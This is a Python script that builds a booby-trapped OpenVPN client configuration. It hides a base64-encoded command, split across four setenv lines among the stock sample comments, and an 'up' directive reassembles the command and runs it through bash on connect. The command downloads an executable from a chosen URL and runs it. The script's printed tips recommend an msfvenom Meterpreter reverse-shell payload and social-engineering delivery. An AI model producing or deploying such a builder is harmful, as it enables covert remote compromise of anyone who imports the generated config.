import base64
import random
import argparse

template = '''##############################################
# Sample client-side OpenVPN 2.0 config file #
# for connecting to multi-client server.     #
#                                            #
# This configuration can be used by multiple #
# clients, however each client should have   #
# its own cert and key files.                #
#                                            #
# On Windows, you might want to rename this  #
# file so it has a .ovpn extension           #
##############################################

# Specify that we are a client and that we
# will be pulling certain config file directives
# from the server.
# client

# Use the same setting as you are using on
# the server.
# On most systems, the VPN will not function
# unless you partially or fully disable
# the firewall for the TUN/TAP interface.
# ;dev tap
dev tun

# Windows needs the TAP-Win32 adapter name
# from the Network Connections panel
# if you have more than one.  On XP SP2,
# you may need to disable the firewall
# for the TAP adapter.
# ;dev-node MyTap

# Are we connecting to a TCP or
# UDP server?  Use the same setting as
# on the server.
# ;proto tcp
proto udp

# The hostname/IP and port of the server.
# You can have multiple remote entries
# to load balance between the servers.
remote 192.168.1.245
ifconfig 10.200.0.2 10.200.0.1

# Choose a random host from the remote
# list for load-balancing.  Otherwise
# try hosts in the order specified.
# ;remote-random

# Keep trying indefinitely to resolve the
# host name of the OpenVPN server.  Very useful
# on machines which are not permanently connected
# to the internet such as laptops.
# resolv-retry infinite
{first}

# Most clients don't need to bind to
# a specific local port number.
nobind

# Downgrade privileges after initialization (non-Windows only)
# ;user nobody
# ;group nobody

# Try to preserve some state across restarts.
persist-key
persist-tun
{second}

# If you are connecting through an
# HTTP proxy to reach the actual OpenVPN
# server, put the proxy server/IP and
# port number here.  See the man page
# if your proxy server requires
# authentication.
# ;http-proxy-retry # retry on connection failures
# ;http-proxy [proxy server] [proxy port #]

# Wireless networks often produce a lot
# of duplicate packets.  Set this flag
# to silence duplicate packet warnings.
;mute-replay-warnings

# SSL/TLS parms.
# See the server config file for more
# description.  It's best to use
# a separate .crt/.key file pair

# for each client.  A single ca
# file can be used for all clients.
# ca ca.crt
# cert client.crt
# key client.key
{thrid}
script-security 2

# Verify server certificate by checking that the
# certificate has the correct key usage set.
# This is an important precaution to protect against
# a potential attack discussed here:
{fourth}
#  http://openvpn.net/howto.html#mitm
#
# To use this feature, you will need to generate
# your server certificates with the keyUsage set to
#   digitalSignature, keyEncipherment
# and the extendedKeyUsage to
#   serverAuth
# EasyRSA can do this for you.
# remote-cert-tls server
up "/bin/bash -c 'echo $resolv$key$client_key$cert|base64 -d|bash'"

# If a tls-auth key is used on the server
# then every client must also have the key.
# tls-auth ta.key 1

# Select a cryptographic cipher.
# If the cipher option is used on the server
# then you must also specify it here.
# Note that v2.4 client/server will automatically
# negotiate AES-256-GCM in TLS mode.
# See also the data-ciphers option in the manpage
# cipher AES-256-CBC

# Enable compression on the VPN link.
# Don't enable this unless it is also
# enabled in the server config file.
#comp-lzo

# Set log file verbosity.
verb 0

# Silence repeating messages
;mute 20
'''

def handle_tempalte(p1,p2,p3,p4):
    return template.format(first='setenv resolv "{}"'.format(p1),
    second='setenv key "{}"'.format(p2),
    thrid='setenv client_key "{}"'.format(p3),
    fourth='setenv cert "{}"'.format(p4))

def encode_payload(url):
    file_str = ''.join(random.sample('zyxwvutsrqponmlkjihgfedcba',4))
    return str(base64.b64encode(bytes("curl {url} -s -o /tmp/{file_str} && chmod +x /tmp/{file_str} && /tmp/{file_str}".format(url=url, file_str=file_str),encoding="utf-8"))).strip("b'")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("url", help="the url where to download your cat")
    args = parser.parse_args()
    evil_code = encode_payload(args.url)
    print("[+] evil_code: {}".format(evil_code))
    flag = int(len(evil_code)/4)
    file_content = handle_tempalte(evil_code[:flag], evil_code[flag:2*flag], evil_code[2*flag:3*flag],evil_code[3*flag:])
    with open("evil.config", "w") as f:
        f.write(file_content)
    print('[*] Done! Maybe you should: msfvenom -p linux/x86/meterpreter_reverse_https LHOST=192.168.114.165 LPORT=8080 -o a -f elf')
    print("[*] And Host your cat by 'python3 -m http.server 80' on your vps")
    print('[+] please look at evil.config, and show me your SET skill')
    